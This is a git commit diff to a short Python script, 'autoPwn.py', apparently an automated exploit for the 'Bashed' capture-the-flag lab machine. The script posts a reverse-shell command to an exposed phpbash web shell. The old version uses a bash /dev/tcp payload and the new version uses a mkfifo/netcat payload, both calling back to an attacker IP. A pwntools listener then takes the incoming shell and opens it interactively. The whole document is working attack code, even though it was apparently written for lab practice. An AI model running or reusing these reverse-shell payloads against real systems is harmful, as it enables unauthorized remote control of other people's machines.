56c3b7c04871bbe23220d01a7473aaea6edd3372
Bless7 <115530716+bl3ss7@users.noreply.github.com>
2022-10-27 01:19:02 +0200

    Update autoPwn.py

--- bashed/autoPwn.py
+++ bashed/autoPwn.py
@@ -1,12 +1,12 @@
 #!/usr/bin/python3
-import requests
+import threading, requests
 from pwn import *
 
 def cmd():
-  target 0 "http://10.10.10.68/dev/phpbash.ph"
-  data = {"cmd": "bash -c \"bash -i >%26 /dev/tcp/10.10.14.18/1337 0>%261\""}
+  target = "http://10.10.10.68/dev/phpbash.php"
+  data = {"cmd": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.18 8888 >/tmp/f"}
   requests.post(target, data)
   
-threading.Thread(target=cmd, args=()).start()
-shell = listen(1337, timeout=20).wait_for_connection()
+threading.Thread(target=cmd).start()
+shell = listen(8888, timeout=20).wait_for_connection()
 shell.interactive()
